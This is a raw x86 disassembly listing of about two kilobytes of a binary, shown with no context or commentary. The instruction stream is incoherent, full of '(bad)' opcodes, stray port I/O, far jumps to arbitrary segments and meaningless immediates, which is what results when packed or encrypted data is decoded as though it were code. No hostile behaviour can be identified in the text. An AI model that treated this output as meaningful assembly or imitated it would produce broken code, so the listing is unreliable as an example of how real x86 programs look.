  41c8ff:	inc    ebx
  41c900:	mov    ebx,0x1bd05d4f
  41c905:	inc    eax
  41c906:	sahf   
  41c907:	add    eax,0xdc36a982
  41c90c:	cwde   
  41c90d:	shl    esp,1
  41c90f:	shl    esp,cl
  41c911:	add    al,0xf5
  41c913:	cmp    BYTE PTR [ebp-0x116206b7],dl
  41c919:	mov    bl,0xe3
  41c91b:	or     eax,0xabe041b0
  41c920:	inc    ebp
  41c921:	stos   DWORD PTR es:[edi],eax
  41c922:	inc    BYTE PTR [ecx+0x404a7055]
  41c928:	dec    edi
  41c929:	xchg   edx,eax
  41c92a:	retf   0x4580
  41c92d:	ds sub eax,0xf49b83c0
  41c933:	dec    ebx
  41c934:	fwait
  41c935:	jne    0xc55fcac
  41c93b:	or     edx,DWORD PTR [ecx]
  41c93d:	in     al,0xf2
  41c93f:	inc    ebx
  41c940:	test   esp,ebp
  41c942:	mov    dh,0x2e
  41c944:	mov    ?,esp
  41c946:	mov    ebx,0x84f730ff
  41c94b:	xchg   BYTE PTR [edi],ah
  41c94d:	pop    eax
  41c94e:	mov    esp,0x5340a84b
  41c953:	pop    es
  41c954:	dec    edx
  41c955:	mov    bh,BYTE PTR [esi-0x26503d7]
  41c95b:	add    DWORD PTR [esi+0x27491be6],edx
  41c961:	and    BYTE PTR [eax-0x5e9668b5],0xa1
  41c968:	call   0x4c10:0x7d2ee4d8
  41c96f:	mov    ah,0x63
  41c971:	jns    0x41c95c
  41c973:	ret    0x485a
  41c976:	jle    0x41c93f
  41c978:	push   ebp
  41c979:	pop    ds
  41c97a:	push   edi
  41c97b:	(bad)  
  41c97c:	mov    ch,0x14
  41c97e:	mov    edi,0x71a8dd8c
  41c983:	ret    0x3d22
  41c986:	xor    cl,BYTE PTR [edi-0x5f]
  41c989:	fwait
  41c98a:	cld    
  41c98b:	clc    
  41c98c:	jb     0x41c99d
  41c98e:	out    dx,eax
  41c98f:	or     bl,BYTE PTR [edx+eax*8-0x12]
  41c993:	aad    0x1b
  41c995:	nop
  41c996:	mov    edx,0x463cd295
  41c99b:	lods   al,BYTE PTR ds:[esi]
  41c99c:	pop    ecx
  41c99d:	ja     0x41c989
  41c99f:	push   ds
  41c9a0:	and    BYTE PTR [esi+0x390f5c60],0xd2
  41c9a7:	xor    ebp,DWORD PTR [edi+eax*1]
  41c9aa:	(bad)  
  41c9ab:	aam    0x6c
  41c9ad:	out    dx,al
  41c9ae:	mov    ecx,DWORD PTR [edx-0x21adf778]
  41c9b4:	test   DWORD PTR [bx+di+0x58],ebp
  41c9b8:	cmp    eax,0x4e3e4b75
  41c9bd:	call   0x7e355245
  41c9c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9c3:	dec    edx
  41c9c4:	enter  0x7ea4,0x1e
  41c9c8:	xor    edx,eax
  41c9ca:	push   es
  41c9cb:	test   eax,0x6e4c291d
  41c9d0:	cmp    esp,ebx
  41c9d2:	das    
  41c9d3:	(bad)  
  41c9d4:	arpl   WORD PTR [ebx+esi*8],bp
  41c9d7:	aaa    
  41c9d8:	bound  esp,QWORD PTR [ecx+0x78e53827]
  41c9de:	int3   
  41c9df:	mov    BYTE PTR [esi+0x7cc25544],cl
  41c9e5:	jecxz  0x41ca18
  41c9e7:	in     eax,0xf8
  41c9e9:	push   esp
  41c9ea:	leave  
  41c9eb:	in     al,0x8a
  41c9ed:	pop    ebp
  41c9ee:	pop    edi
  41c9ef:	cmp    dl,ch
  41c9f1:	pop    ebp
  41c9f2:	(bad)
  41c9f6:	mov    esi,0x71f6f2f7
  41c9fb:	std    
  41c9fc:	or     eax,0x2c4fe621
  41ca01:	mov    bl,0xbf
  41ca03:	push   ds
  41ca04:	push   ecx
  41ca05:	pop    esi
  41ca06:	pop    ecx
  41ca07:	retf   
  41ca08:	push   esp
  41ca09:	xor    BYTE PTR [edi+0x76],0x57
  41ca0d:	and    al,0x58
  41ca0f:	inc    ecx
  41ca10:	mov    ch,0xcf
  41ca12:	jno    0x41ca61
  41ca14:	xor    al,0x5c
  41ca16:	mov    ds:0xa3c40c13,eax
  41ca1b:	lods   eax,DWORD PTR ds:[esi]
  41ca1c:	into   
  41ca1d:	leave  
  41ca1e:	sbb    DWORD PTR [ecx],edi
  41ca20:	js     0x41ca06
  41ca22:	cmp    DWORD PTR [edi+0x78],esi
  41ca25:	push   0xffffff9e
  41ca27:	sbb    eax,DWORD PTR [ebx-0x35d2ad99]
  41ca2d:	pop    ebx
  41ca2e:	dec    ecx
  41ca2f:	aas    
  41ca30:	xlat   BYTE PTR ds:[ebx]
  41ca31:	sub    esp,ebp
  41ca33:	mov    bl,0xee
  41ca35:	adc    al,0xbe
  41ca37:	pop    ebx
  41ca38:	cmp    ch,BYTE PTR [edi+0x3b095621]
  41ca3e:	xor    ebp,ecx
  41ca40:	(bad)  
  41ca43:	xchg   dx,ax
  41ca45:	dec    ebx
  41ca46:	(bad)  [edi]
  41ca48:	or     BYTE PTR [esi-0x118a18b1],ah
  41ca4e:	and    eax,0xa80766cb
  41ca53:	or     eax,DWORD PTR [edi+ebx*4-0x7694475c]
  41ca5a:	push   esp
  41ca5b:	sbb    ebp,DWORD PTR [edi+0x12504aa5]
  41ca61:	retfw  0x2377
  41ca65:	sbb    BYTE PTR [edx],ch
  41ca67:	cmp    edx,DWORD PTR [eax+0x4bd67c9f]
  41ca6d:	data16 fs std 
  41ca70:	push   edx
  41ca71:	loope  0x41ca7b
  41ca73:	jnp    0x41caa5
  41ca75:	mov    DWORD PTR [edx],0xe0fc1158
  41ca7b:	pop    ss
  41ca7c:	test   BYTE PTR [esi+0x6abf2146],0x5f
  41ca83:	daa    
  41ca84:	xchg   edi,eax
  41ca85:	pop    ebp
  41ca86:	xchg   esp,eax
  41ca87:	mov    ds:0x922b1306,eax
  41ca8c:	and    dl,BYTE PTR [ebp+0x74b62085]
  41ca92:	iret   
  41ca93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca94:	ins    DWORD PTR es:[edi],dx
  41ca95:	push   esp
  41ca96:	mov    ah,0x55
  41ca98:	add    edi,DWORD PTR [esi-0x5b99fd6d]
  41ca9e:	test   BYTE PTR [esi-0x9],ah
  41caa1:	push   edx
  41caa2:	mov    BYTE PTR [edx-0x3d35b661],al
  41caa8:	pop    esi
  41caa9:	test   BYTE PTR [ecx-0x48],0x30
  41caad:	sub    BYTE PTR [edi-0x1c],dl
  41cab0:	sub    DWORD PTR [esp+ebx*1-0x46],esi
  41cab4:	cmp    al,0xc7
  41cab6:	push   edi
  41cab7:	dec    edi
  41cab8:	pusha  
  41cab9:	and    BYTE PTR [esp+eiz*4-0x3d8849a8],0x99
  41cac1:	or     al,BYTE PTR [ebp-0x5]
  41cac4:	sub    DWORD PTR [esi+esi*2-0x69],ebx
  41cac8:	jmp    0x6749:0x8255a3d3
  41cacf:	repnz pop ebp
  41cad1:	fdiv   st,st(5)
  41cad3:	(bad)  
  41cad4:	adc    DWORD PTR [esi+edx*2],ebp
  41cad7:	xor    BYTE PTR [eax-0x63],dl
  41cada:	mov    ecx,0x67a33ac7
  41cadf:	push   ds
  41cae0:	in     al,0x33
  41cae2:	xchg   BYTE PTR [ebx+eiz*2-0x1b5fbfae],dl
  41cae9:	jbe    0x41cb2d
  41caeb:	scas   al,BYTE PTR es:[edi]
  41caec:	fstp   st(5)
  41caee:	repnz adc ah,bh
  41caf1:	loopne 0x41ca7a
  41caf3:	mov    ds,WORD PTR [eax-0x7f]
  41caf6:	loopne 0x41cb41
  41caf8:	sbb    DWORD PTR [eax],eax
  41cafa:	xor    bl,BYTE PTR [ecx+esi*2+0x587a2db8]
  41cb01:	mov    WORD PTR [eax],ds
  41cb03:	in     eax,0x83
  41cb05:	(bad)  
  41cb06:	test   al,0x30
  41cb08:	xor    bl,BYTE PTR [eax]
  41cb0a:	mov    eax,ds:0xcc7120f0
  41cb0f:	or     esp,eax
  41cb11:	dec    edi
  41cb12:	(bad)  
  41cb13:	adc    ecx,DWORD PTR [edx-0x45437104]
  41cb19:	xor    bh,BYTE PTR [eax-0x5c5a6033]
  41cb1f:	dec    ebx
  41cb20:	scas   eax,DWORD PTR es:[edi]
  41cb21:	inc    ebx
  41cb22:	cwde   
  41cb23:	xor    esp,DWORD PTR [edi]
  41cb25:	es push ss
  41cb27:	mov    al,0xa1
  41cb29:	adc    eax,esp
  41cb2b:	lea    edi,[esi+0x40369d7c]
  41cb31:	jge    0x41cb0b
  41cb33:	mov    BYTE PTR [eax-0x1c],ch
  41cb36:	jns    0x41cb06
  41cb38:	in     eax,0x31
  41cb3a:	jae    0x41cb92
  41cb3c:	pop    ds
  41cb3d:	in     al,dx
  41cb3e:	sub    DWORD PTR [ebx-0x6e],0x63b1f18d
  41cb45:	popf   
  41cb46:	push   edx
  41cb47:	call   DWORD PTR [eax]
  41cb49:	sub    edx,DWORD PTR [ebx]
  41cb4b:	jnp    0x41cb4e
  41cb4d:	or     eax,0x825c9326
  41cb52:	sub    eax,0x66023e7d
  41cb57:	xor    BYTE PTR [esi+ebx*8-0x60866cb2],0xd4
  41cb5f:	push   es
  41cb60:	inc    ebp
  41cb61:	sub    ecx,esp
  41cb63:	jno    0x41cb65
  41cb65:	(bad)  
  41cb66:	mov    ebx,0x98f7e089
  41cb6b:	xchg   DWORD PTR [edi+0x7ae78048],esi
  41cb71:	add    al,0x33
  41cb73:	mov    bh,0x24
  41cb75:	xor    BYTE PTR [ebx],cl
  41cb77:	push   0xfa0f009d
  41cb7c:	jmp    0x41cbd3
  41cb7e:	outs   dx,DWORD PTR ds:[esi]
  41cb7f:	mov    ch,dh
  41cb81:	xchg   ecx,eax
  41cb82:	cld    
  41cb83:	out    0xa2,eax
  41cb85:	inc    esp
  41cb86:	cli    
  41cb87:	call   0x6cf8:0x5fd7a92f
  41cb8e:	push   esp
  41cb8f:	xlat   BYTE PTR ds:[ebx]
  41cb90:	mov    bh,0xde
  41cb92:	test   al,0xd6
  41cb94:	leave  
  41cb95:	adc    ch,BYTE PTR [eax-0x48]
  41cb98:	push   esp
  41cb99:	rol    DWORD PTR [edx+0x37],0x95
  41cb9d:	or     eax,0xef410a8b
  41cba2:	mov    al,ds:0x3dc3cbe5
  41cba7:	(bad)  
  41cba8:	pusha  
  41cba9:	mov    WORD PTR [esi-0x59],ss
  41cbac:	scas   al,BYTE PTR es:[edi]
  41cbad:	sbb    bl,BYTE PTR [eax]
  41cbaf:	inc    edi
  41cbb0:	adc    al,BYTE PTR [ebx-0x2f4cc92c]
  41cbb6:	imul   esi,esp,0xffffffe5
  41cbb9:	pop    edx
  41cbba:	jmp    0xb0e10b25
  41cbbf:	adc    BYTE PTR [edi],dl
  41cbc1:	inc    ebp
  41cbc2:	arpl   WORD PTR [edi+esi*8-0x549c08d6],bp
  41cbc9:	xchg   BYTE PTR cs:0x9ede0b08,bl
  41cbd0:	mov    ebx,0xf5b51f10
  41cbd5:	rcr    dh,1
  41cbd7:	mov    bl,0x25
  41cbd9:	retf   0xd1c7
  41cbdc:	and    al,0x13
  41cbde:	aad    0x85
  41cbe0:	jmp    0x2eff02ef
  41cbe5:	jo     0x41cb87
  41cbe7:	and    bl,0xd2
  41cbea:	adc    BYTE PTR es:[esp+eax*8+0x71],ch
  41cbef:	cmp    al,0x69
  41cbf1:	shl    ebp,0x16
  41cbf4:	cmp    edx,DWORD PTR [eax-0xa]
  41cbf7:	sbb    esi,DWORD PTR [eax-0x74]
  41cbfa:	ss jne 0x41cb8b
  41cbfd:	pop    es
  41cbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbff:	or     DWORD PTR [eax-0x4261355d],esp
  41cc05:	and    BYTE PTR [ebp+0x2b75a18],ch
  41cc0b:	mov    ?,WORD PTR [edi+0xc52dbed]
  41cc11:	mov    bh,0xcb
  41cc13:	cwde   
  41cc14:	pop    es
  41cc15:	cmp    BYTE PTR [eax+ebp*8],dh
  41cc18:	loope  0x41cc20
  41cc1a:	or     al,0xad
  41cc1c:	mov    al,0x30
  41cc1e:	cs mul BYTE PTR gs:[ebx-0x3b]
  41cc23:	adc    eax,0xbd627ffb
  41cc28:	mov    dl,0x43
  41cc2a:	inc    eax
  41cc2b:	ins    DWORD PTR es:[edi],dx
  41cc2c:	(bad)
  41cc2f:	jno    0x41cc77
  41cc31:	dec    esp
  41cc32:	and    BYTE PTR [ecx+edi*1],ch
  41cc35:	hlt    
  41cc36:	adc    BYTE PTR [ebx+esi*8-0x71ee2a1b],bl
  41cc3d:	push   ds
  41cc3e:	icebp  
  41cc3f:	in     al,0x84
  41cc41:	sbb    edi,DWORD PTR [ebx+eiz*2-0x7d]
  41cc45:	repnz nop
  41cc47:	cmp    ebp,eax
  41cc49:	push   ebp
  41cc4a:	adc    esp,DWORD PTR [ecx-0x73]
  41cc4d:	mov    bh,0xb8
  41cc4f:	dec    ebx
  41cc50:	mov    ah,0xea
  41cc52:	push   cs
  41cc53:	cdq    
  41cc54:	fstp   QWORD PTR [edi]
  41cc56:	jbe    0x41cc44
  41cc58:	lods   eax,DWORD PTR ds:[esi]
  41cc59:	int    0x1e
  41cc5b:	js     0x41cc42
  41cc5d:	inc    edi
  41cc5e:	pop    ebx
  41cc5f:	cmc    
  41cc60:	inc    eax
  41cc61:	mov    dl,0x4e
  41cc63:	ror    ebx,cl
  41cc65:	adc    ebx,DWORD PTR [ebx+ebx*1]
  41cc68:	imul   ecx,esi,0xffffffc3
  41cc6b:	sbb    dh,dh
  41cc6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc6e:	ss adc edi,DWORD PTR cs:[ebx+edx*8+0x22]
  41cc74:	js     0x41ccdb
  41cc76:	push   ebx
  41cc77:	jmp    0x41cca8
  41cc79:	fld    TBYTE PTR [esi-0x37b27686]
  41cc7f:	retf   
  41cc80:	js     0x41ccb9
  41cc82:	xor    ebx,DWORD PTR [ebx]
  41cc84:	out    0x43,al
  41cc86:	mov    ds:0x67aae246,eax
  41cc8b:	sbb    DWORD PTR [eax-0x56533b03],edx
  41cc91:	repz and al,0x35
  41cc94:	fcmovbe st,st(0)
  41cc96:	aad    0x35
  41cc98:	(bad)  
  41cc9a:	mov    al,ds:0xcffc762b
  41cc9f:	js     0x41cca6
  41cca1:	adc    DWORD PTR [edx-0x3a9974dd],edi
  41cca7:	pop    ss
  41cca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cca9:	out    dx,eax
  41ccaa:	cmp    ecx,DWORD PTR [esi+0x27c02a65]
  41ccb0:	pop    edx
  41ccb1:	lods   eax,DWORD PTR ds:[esi]
  41ccb2:	pushf  
  41ccb3:	push   ecx
  41ccb4:	mov    esi,0x73a0651e
  41ccb9:	cs mov ecx,0x37cfab6
  41ccbf:	mov    eax,0xe4ebd4e4
  41ccc4:	and    DWORD PTR [ebx],esp
  41ccc6:	call   0xae04bba4
  41cccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cccc:	xor    BYTE PTR [ecx-0x6f944955],al
  41ccd2:	stos   BYTE PTR es:[edi],al
  41ccd3:	cmp    eax,0xb4fa2e17
  41ccd8:	inc    edx
  41ccd9:	or     al,0xf4
  41ccdb:	xchg   esp,eax
  41ccdc:	in     al,dx
  41ccdd:	and    al,0xac
  41ccdf:	mov    esi,0xf6f5b0fd
  41cce4:	stc    
  41cce5:	into   
  41cce6:	scas   al,BYTE PTR es:[edi]
  41cce7:	cmp    DWORD PTR [ecx-0x38],ebx
  41ccea:	jg     0x41cd59
  41ccec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cced:	jl     0x41cd27
  41ccef:	int3   
  41ccf0:	or     BYTE PTR [eax+0x0],al
  41ccf3:	push   cs
  41ccf4:	sbb    BYTE PTR ds:0x739e9ba8,ah
  41ccfa:	into   
  41ccfb:	and    al,0x81
  41ccfd:	sub    bh,bh
  41ccff:	(bad)  
  41cd00:	mov    edi,0xc239205f
  41cd05:	inc    edi
  41cd06:	dec    esi
  41cd07:	jne    0x41cd2b
  41cd09:	and    DWORD PTR [edi],esp
  41cd0b:	out    dx,al
  41cd0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd0d:	loopne 0x41ccb4
  41cd0f:	out    0x85,eax
  41cd11:	js     0x41ccd7
  41cd13:	rcl    BYTE PTR [ebx],0x8c
  41cd16:	std    
  41cd17:	pop    edi
  41cd18:	jg     0x41cd13
  41cd1a:	adc    BYTE PTR [ebx],dh
  41cd1c:	(bad)  
  41cd1d:	pop    ds
  41cd1e:	dec    edx
  41cd1f:	test   bl,al
  41cd21:	cmp    DWORD PTR [esi-0x2c],esp
  41cd24:	dec    ecx
  41cd25:	pusha  
  41cd26:	in     al,0xfb
  41cd28:	ss popa 
  41cd2a:	aas    
  41cd2b:	icebp  
  41cd2c:	mov    bh,0x42
  41cd2e:	sub    cl,bl
  41cd30:	aad    0xe4
  41cd32:	mov    esp,0xadc78872
  41cd37:	sub    DWORD PTR [edx],0x4c1b5e15
  41cd3d:	add    eax,0x8e0ade29
  41cd42:	fwait
  41cd43:	lock shl BYTE PTR [ecx+0x2b],0xba
  41cd48:	cmc    
  41cd49:	or     eax,0xd1e1ae8e
  41cd4e:	inc    ecx
  41cd4f:	jmp    0x2ef7e85d
  41cd54:	adc    BYTE PTR [eax],dh
  41cd56:	repnz or DWORD PTR [ebx-0x2f],ebx
  41cd5a:	pop    edx
  41cd5b:	mov    esi,0xaf1485da
  41cd60:	xchg   esi,eax
  41cd61:	not    DWORD PTR [ebp+0x37]
  41cd64:	mov    edx,0xc1eb858
  41cd69:	adc    BYTE PTR [edx+0x658db5c8],bl
  41cd6f:	jns    0x41cde2
  41cd71:	sbb    BYTE PTR [ebx],0x7f
  41cd74:	test   BYTE PTR [ecx],dh
  41cd76:	xchg   ebx,eax
  41cd77:	mov    bl,0x65
  41cd79:	mov    bx,0x8398
  41cd7d:	add    al,0x86
  41cd7f:	xor    al,BYTE PTR [ebp+0x4d]
  41cd82:	add    al,0xa3
  41cd84:	sbb    eax,0xe4f46038
  41cd89:	ror    edi,1
  41cd8b:	(bad)
  41cd8e:	mov    ds:0x3a4ecc9c,al
  41cd93:	fdiv   QWORD PTR [esi-0x783a0bcd]
  41cd99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd9a:	aaa    
  41cd9b:	pop    ecx
  41cd9c:	(bad)
  41cda0:	ret    
  41cda1:	inc    ecx
  41cda2:	adc    ecx,DWORD PTR [esi+0x7a]
  41cda5:	out    0xe1,eax
  41cda7:	out    0xe8,eax
  41cda9:	adc    bl,ch
  41cdab:	cmp    edx,ebp
  41cdad:	mov    bh,0xfc
  41cdaf:	int3   
  41cdb0:	psllw  xmm5,XMMWORD PTR [edx]
  41cdb4:	mov    edi,0xcbce660b
  41cdb9:	out    dx,eax
  41cdba:	lds    ebx,FWORD PTR [edi]
  41cdbc:	popf   
  41cdbd:	adc    al,0x21
  41cdbf:	or     DWORD PTR [esi+0x7b],0x33
  41cdc3:	cmp    esi,DWORD PTR [ebx+eiz*1+0x16a6afa3]
  41cdca:	lds    esi,FWORD PTR [edi]
  41cdcc:	mov    eax,ds:0x9b83b029
  41cdd1:	and    BYTE PTR [eax-0xd],ah
  41cdd4:	xchg   ebx,eax
  41cdd5:	xchg   ebx,eax
  41cdd6:	scas   eax,DWORD PTR es:[edi]
  41cdd7:	aaa    
  41cdd8:	test   eax,0xd3f5c6a9
  41cddd:	into   
  41cdde:	adc    ah,BYTE PTR [ebx+0x3d]
  41cde1:	mov    eax,ds:0xd34449d8
  41cde6:	jo     0x41cdbb
  41cde8:	pop    eax
  41cde9:	pop    edx
  41cdea:	adc    BYTE PTR ds:0xfa11e2cd,dh
  41cdf0:	enter  0x3879,0xe1
  41cdf4:	adc    BYTE PTR [ecx-0x1a],dl
  41cdf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf8:	jno    0x41cd99
  41cdfa:	add    DWORD PTR [ebx],edi
  41cdfc:	lods   eax,DWORD PTR ds:[esi]
  41cdfd:	fldenv [ecx]
  41cdff:	or     al,0xc3
  41ce01:	inc    ebp
  41ce02:	and    DWORD PTR [ebx+0x59e53931],esp
  41ce08:	lock jl 0x41ce87
  41ce0b:	in     eax,0x52
  41ce0d:	mov    eax,0x4366e2c1
  41ce12:	pop    eax
  41ce13:	mov    bh,0xe7
  41ce15:	in     al,dx
  41ce16:	out    0xe0,al
  41ce18:	jb     0x41ce99
  41ce1a:	xlat   BYTE PTR ds:[ebx]
  41ce1b:	ror    ch,1
  41ce1d:	mov    ds:0x34cb58ac,eax
  41ce22:	int3   
  41ce23:	xchg   ah,dl
  41ce25:	inc    esi
  41ce26:	push   eax
  41ce27:	push   ds
  41ce28:	pop    edx
  41ce29:	adc    eax,DWORD PTR [ebx+0xd]
  41ce2c:	dec    esp
  41ce2d:	gs out 0x27,al
  41ce30:	les    ecx,FWORD PTR [edx]
  41ce32:	in     eax,0xd5
  41ce34:	cdq    
  41ce35:	adc    esp,DWORD PTR [edx]
  41ce37:	xlat   BYTE PTR ds:[ebx]
  41ce38:	in     al,0xae
  41ce3a:	inc    eax
  41ce3b:	and    eax,0xff2f8bff
  41ce40:	pop    esi
  41ce41:	sbb    BYTE PTR [edx+0x858aee3],ah
  41ce47:	in     eax,0x6a
  41ce49:	sti    
  41ce4a:	pop    ss
  41ce4b:	out    dx,al
  41ce4c:	rol    DWORD PTR [edx-0x4be935e],cl
  41ce52:	mov    dh,0xfa
  41ce54:	lea    ebx,es:[ebx+ecx*2]
  41ce58:	push   esp
  41ce59:	mov    ebx,0x5f8c4e9c
  41ce5e:	out    0xc7,eax
  41ce60:	call   0x2eea:0xaccda853
  41ce67:	add    al,0x7
  41ce69:	repnz mov edi,0xb09377fd
  41ce6f:	add    eax,0x667e1021
  41ce74:	push   esp
  41ce75:	and    al,0xa
  41ce77:	nop
  41ce78:	cmp    ecx,DWORD PTR [eax-0x76]
  41ce7b:	(bad)  
  41ce7d:	xchg   ebp,eax
  41ce7e:	clc    
  41ce7f:	push   esi
  41ce80:	pop    ss
  41ce81:	jae    0x41ce42
  41ce83:	xlat   BYTE PTR ds:[ebx]
  41ce84:	and    DWORD PTR [edx-0xe925e8a],esp
  41ce8a:	mov    al,ds:0xac2554d3
  41ce8f:	xlat   BYTE PTR ds:[ebx]
  41ce90:	adc    eax,DWORD PTR ds:0x24c01108
  41ce96:	mov    ecx,0x28df24c3
  41ce9b:	mov    cl,0x16
  41ce9d:	js     0x41ce7a
  41ce9f:	sub    bl,BYTE PTR [eax]
  41cea1:	test   DWORD PTR [edi-0x6880dc57],ebp
  41cea7:	data16 mov WORD PTR [edi+eax*8+0x430a790a],cs
  41ceaf:	xor    ah,BYTE PTR es:[edx+0x71d0b87d]
  41ceb6:	data16 aaa 
  41ceb8:	iret   
  41ceb9:	arpl   dx,bp
  41cebb:	mov    esi,0x2cce89ea
  41cec0:	push   ebp
  41cec1:	(bad)  
  41cec2:	sbb    al,0xda
  41cec4:	outs   dx,DWORD PTR cs:[esi]
  41cec6:	not    BYTE PTR [ebp+0x49fc203c]
  41cecc:	sbb    bl,BYTE PTR [eax-0x2a]
  41cecf:	mov    ds:0x1d3af515,eax
  41ced4:	xor    eax,0x45c6089
  41ced9:	cmp    DWORD PTR [edi+0x78],0xffffff8a
  41cedd:	dec    DWORD PTR [edi-0xc]
  41cee0:	adc    dl,BYTE PTR ds:0x734ab271
  41cee6:	xchg   ebp,eax
  41cee7:	mov    eax,ds:0xb26f6c27
  41ceec:	mov    edi,0xe3e68224
  41cef1:	xor    al,0x46
  41cef3:	mov    esp,0x860b4b20
  41cef8:	test   al,0xea
  41cefa:	(bad)  
  41cefb:	int    0xc5
  41cefd:	inc    edx
  41cefe:	out    dx,eax
  41ceff:	mov    eax,ds:0x2b98a5d4
  41cf04:	sub    dh,BYTE PTR [edi+edi*4+0x68]
  41cf08:	call   0x4f47:0x666088f
  41cf0f:	dec    ebp
  41cf10:	inc    edi
  41cf11:	mov    ch,bh
  41cf13:	stos   DWORD PTR es:[edi],eax
  41cf14:	dec    ecx
  41cf15:	pop    ebp
  41cf16:	xchg   DWORD PTR [edi+0x136d54cf],edi
  41cf1c:	cmp    al,cl
  41cf1e:	or     eax,0x528167a4
  41cf23:	jmp    0x8904663d
  41cf28:	xor    BYTE PTR ds:0x8f4075e2,dh
  41cf2e:	push   ebx
  41cf2f:	test   cl,bl
  41cf31:	rcl    DWORD PTR [ebp+0x1e],1
  41cf34:	jmp    0x9c359918
  41cf39:	loop   0x41cede
  41cf3b:	lea    ebp,[edx]
  41cf3d:	out    0x22,eax
  41cf3f:	in     al,0xd4
  41cf41:	xchg   ebx,eax
  41cf42:	push   ebp
  41cf43:	cmp    ebx,DWORD PTR [ebx]
  41cf45:	xor    esi,edi
  41cf47:	inc    ecx
  41cf48:	xor    DWORD PTR [eax+0x7c],0xffffff87
  41cf4c:	mov    esi,DWORD PTR [ecx+0x3]
  41cf4f:	in     al,dx
  41cf50:	ret    0xb2b9
  41cf53:	stos   DWORD PTR es:[edi],eax
  41cf54:	push   esi
  41cf55:	sub    DWORD PTR [esi+0x4b],esi
  41cf58:	std    
  41cf59:	inc    edi
  41cf5a:	clc    
  41cf5b:	not    DWORD PTR [eax-0x2067e6a8]
  41cf61:	cs xchg esi,eax
  41cf63:	mov    ebx,0xfb620e79
  41cf68:	retf   
  41cf69:	fisttp DWORD PTR [edx]
  41cf6b:	push   edx
  41cf6c:	scas   eax,DWORD PTR es:[edi]
  41cf6d:	mov    BYTE PTR [esi-0x28a46488],dh
  41cf73:	iret   
  41cf74:	jl     0x41cf7a
  41cf76:	pop    ss
  41cf77:	sub    al,0xba
  41cf79:	hlt    
  41cf7a:	test   BYTE PTR [ebp-0x3ad76e6c],dl
  41cf80:	fiadd  WORD PTR [edx-0x3b]
  41cf83:	mov    ch,0xfc
  41cf85:	mov    al,0x98
  41cf87:	add    ch,BYTE PTR [esi+0x6e130e4e]
  41cf8d:	call   0x4308:0xa94d5433
  41cf94:	into   
  41cf95:	and    eax,0xc2f70f32
  41cf9a:	adc    DWORD PTR [ebx],edi
  41cf9c:	inc    esp
  41cf9d:	push   cs
  41cf9e:	pop    ebp
  41cf9f:	fisubr WORD PTR [edx+0x69]
  41cfa2:	nop
  41cfa3:	fnstcw WORD PTR [ebx-0x46]
  41cfa6:	scas   al,BYTE PTR es:[edi]
  41cfa7:	popf   
  41cfa8:	xchg   ecx,eax
  41cfa9:	stos   DWORD PTR es:[edi],eax
  41cfaa:	seta   ah
  41cfad:	and    DWORD PTR [esi+0x7c],edx
  41cfb0:	push   ebx
  41cfb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfb2:	frstor [eax]
  41cfb4:	jl     0x41cfe5
  41cfb6:	sbb    al,0x5b
  41cfb8:	jecxz  0x41cf61
  41cfba:	mov    bh,0x31
  41cfbc:	cmp    DWORD PTR [ebp+0x7d93138a],edx
  41cfc2:	xchg   ebp,eax
  41cfc3:	ror    BYTE PTR [ebp+0x60cb8165],0x7a
  41cfca:	fdivr  st(7),st
  41cfcc:	dec    edx
  41cfcd:	mov    ch,0xc1
  41cfcf:	les    esi,FWORD PTR [esi-0x4379471d]
  41cfd5:	pop    eax
  41cfd6:	add    DWORD PTR [ebx-0x765e17e2],eax
  41cfdc:	push   ebx
  41cfdd:	cmp    bl,ch
  41cfdf:	mov    edx,0x4b0ee49d
  41cfe4:	mov    esi,0x2e7843aa
  41cfe9:	push   eax
  41cfea:	jmp    0x65a2ca14
  41cfef:	jo     0x41d05f
  41cff1:	cld    
  41cff2:	sar    BYTE PTR [eax+0x1627d3e0],0x3e
  41cff9:	aam    0xe1
  41cffb:	xchg   edx,eax
  41cffc:	loope  0x41d038
  41cffe:	retf   
  41cfff:	inc    ebp
  41d000:	fdivr  st(3),st
  41d002:	and    al,0x2
  41d004:	repz adc BYTE PTR [ebx+edi*1],ch
  41d008:	call   0x3847:0xc0619075
  41d00f:	imul   ebp,DWORD PTR [ecx],0xe87df971
  41d015:	fst    DWORD PTR [esi]
  41d017:	dec    esp
  41d018:	aaa    
  41d019:	push   eax
  41d01a:	pop    es
  41d01b:	nop
  41d01c:	and    eax,0x8f47ea01
  41d021:	push   ecx
  41d022:	and    BYTE PTR [ebp-0x58867241],al
  41d028:	repnz mov dl,0xfd
  41d02b:	mov    esi,0x2d21e00a
  41d030:	sbb    eax,0x458701ca
  41d035:	pop    es
  41d036:	(bad)  
  41d037:	mov    al,0x6
  41d039:	adc    eax,DWORD PTR [ecx]
  41d03b:	int    0xd3
  41d03d:	test   edx,0xcb721eb
  41d043:	and    ah,dl
  41d045:	iret   
  41d046:	clc    
  41d047:	xlat   BYTE PTR ds:[ebx]
  41d048:	and    eax,0x83bdc211
  41d04d:	das    
  41d04e:	(bad)  
  41d050:	ins    DWORD PTR es:[edi],dx
  41d051:	mov    esi,ebx
  41d053:	(bad)  
  41d055:	sbb    ecx,ecx
  41d057:	sub    DWORD PTR [eax-0x14],esp
  41d05a:	stos   BYTE PTR es:[edi],al
  41d05b:	sbb    dh,BYTE PTR [edx]
  41d05d:	fidiv  DWORD PTR [ecx-0x71e2c5d7]
  41d063:	mov    bl,0x6e
  41d065:	jmp    0x960b:0x1b3e79e9
  41d06c:	sbb    eax,0x209d4b11
  41d071:	and    al,0xa8
  41d073:	int3   
  41d074:	faddp  st(7),st
  41d076:	fcomp  DWORD PTR [esi+ebp*8-0x28461cbd]
  41d07d:	jnp    0x41d0d3
  41d07f:	mov    esi,0x80714bd5
  41d084:	or     dl,al
  41d086:	gs cmp eax,0x1366b9aa
  41d08c:	push   es
  41d08d:	jmp    0xc6ae:0xfce593d
